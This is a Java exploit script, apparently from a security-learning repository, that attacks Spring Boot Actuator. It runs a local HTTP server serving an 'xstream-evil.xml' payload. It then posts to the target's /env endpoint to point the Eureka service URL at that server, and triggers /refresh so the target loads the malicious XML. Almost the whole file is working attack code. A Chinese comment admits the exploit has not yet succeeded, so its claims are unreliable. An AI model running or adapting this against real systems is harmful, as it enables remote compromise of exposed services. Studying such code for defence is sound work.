package com.threedr3am.bug.spring.actuator;

import com.threedr3am.bug.common.server.HTTPServer;
import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * todo 暂时没测试成功，请求出去了，但是返回的xstream evil xml不管用
 * copy xstream-evil.xml to http server root（todo need Eureka-Client <1.8.7）
 *
 * @author threedr3am
 */
public class EurekaAttackForXStream {

  static {
    HTTPServer.filePath = "/Users/xuanyonghao/security/java/my-project/learnjavabug/spring/spring-boot-actuator-bug/actuator-1.4/src/main/resources/xstream-evil.xml";
    HTTPServer.PORT = 22222;
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "eureka.client.serviceUrl.defaultZone=http://127.0.0.1:22222/xstream-evil.xml";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/x-www-form-urlencoded", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/refresh");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
